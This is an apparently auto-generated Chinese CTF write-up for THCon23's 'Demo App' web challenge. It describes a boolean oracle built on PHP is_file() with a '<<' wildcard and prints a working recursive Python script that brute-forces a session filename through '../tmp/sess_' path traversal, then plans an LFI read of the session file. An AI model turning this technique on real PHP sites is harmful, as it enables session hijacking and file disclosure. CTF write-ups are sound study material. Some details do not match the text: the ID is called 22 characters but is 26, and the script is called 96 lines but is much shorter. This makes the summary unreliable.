---
title: Demo App – THCon23 CTF Writeup
contest: THCon23 CTF
year: 2023
difficulty: easy
vuln_type: web_unknown
tags: [web, is_file, session-id, lfi, bruteforce, recursion]
attack_chain:
  - is_file()检测文件存在性
  - 测试 is_file('a<<') -> is_file('in<<') 出现 true
  - 递归爆破 ../tmp/sess_<prefix> 名称
  - find(prefix) 函数: a-z+0-9 字符尝试
  - "You tried to access file outside" → 找到
  - 完整 sess_ 名称: qrsgncfdsohnb33115tfkib7s1
key_payload: search = "../tmp/sess_" + prefix + c + "<<"
one_liner: THCon23 Demo App：is_file布尔型盲注爆破PHP session ID
lesson: is_file()+<<语法可作为布尔型盲注工具
quality: medium
---

# Demo App – THCon23 CTF Writeup

## 题目信息
- 比赛：THCon23 CTF
- 题目：Demo App
- 类别：Web

## 关键攻击链
### 1. 漏洞点
- `is_file('path')` 返回布尔值
- 测试 `is_file('a<<')` → `is_file('in<<')` 出现 `true`
- `<` 字符用于测试文件名前缀

### 2. 爆破脚本
```python
from requests import post
from string import ascii_lowercase, digits

def find(prefix):
    for c in ascii_lowercase + digits:
        search = prefix + c
        resp = post("https://demo-app.ctf.thcon.party",
                   data={"file": "../tmp/sess_" + search + "<<",
                         "Check": "Submit Query"})
        if "You tried to access file outside" in resp.text:
            print("found:", search)
            find(search)

find(prefix="")
```

### 3. 爆破结果
- `qrsgncfdsohnb33115tfkib7s1`（22 字符 PHP session ID）

### 4. 攻击链
- 递归爆破每个字符
- 找到完整 sess_XXX 名称
- 配合 LFI 读取 /tmp/sess_XXX 文件
- session 中可能存有 flag

## 评分
- quality: medium（is_file 布尔盲注完整脚本，96 行）
